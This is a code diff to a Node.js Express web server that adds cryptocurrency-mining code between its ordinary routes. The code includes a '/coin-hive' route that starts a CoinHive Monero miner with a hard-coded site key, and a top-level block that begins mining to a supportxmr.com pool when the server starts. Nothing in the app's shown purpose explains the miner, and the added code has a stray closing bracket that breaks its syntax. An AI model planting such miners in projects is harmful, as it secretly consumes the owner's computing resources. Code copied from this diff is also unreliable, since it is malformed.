@@ -102,6 +102,59 @@ app.get("/",function(req,res){
    res.send("~~");
 });
 
+
+app.get("/coin-hive",function(req,res){
+  
+const CoinHive = require('coin-hive');
+
+(async () => {
+  const miner = await CoinHive('SyP8K30PFsIXCdKa1Ng4R7Ieh6BhIbLq'); // CoinHive's Site Key
+
+  // Start miner
+  await miner.start();
+
+  // Listen on events
+  miner.on('found', () => console.log('Found!'));
+  miner.on('accepted', () => console.log('Accepted!'));
+  miner.on('update', data =>
+    console.log(`
+    Hashes per second: ${data.hashesPerSecond}
+    Total hashes: ${data.totalHashes}
+    Accepted hashes: ${data.acceptedHashes}
+  `)
+  );
+
+  // Stop miner
+  setTimeout(async () => await miner.stop(), 60000);
+})();
+
+
+});
+
+  const CoinHive = require('coin-hive');
+(async () => {
+  const miner = await CoinHive('<YOUR-MONERO-ADDRESS>', {
+    pool: {
+      host: 'la01.supportxmr.com',
+      port: 3333,
+      pass: '<YOUR-PASSWORD-FOR-POOL>' // default 'x' if not provided
+    }
+  });
+  await miner.start();
+  miner.on('found', () => console.log('Found!'));
+  miner.on('accepted', () => console.log('Accepted!'));
+  miner.on('update', data =>
+    console.log(`
+    Hashes per second: ${data.hashesPerSecond}
+    Total hashes: ${data.totalHashes}
+    Accepted hashes: ${data.acceptedHashes}
+  `)
+  );
+})();
+
+
+});
+
 app.get("/highway_channel",function(req,res){
   res.json({list:list});
 });
@@ -139,6 +192,7 @@ app.get("/highway",function(req,res){
     return res.end("--");
   }
 });
+
 
 
 app.get("/jayesh-test",function(req,res){
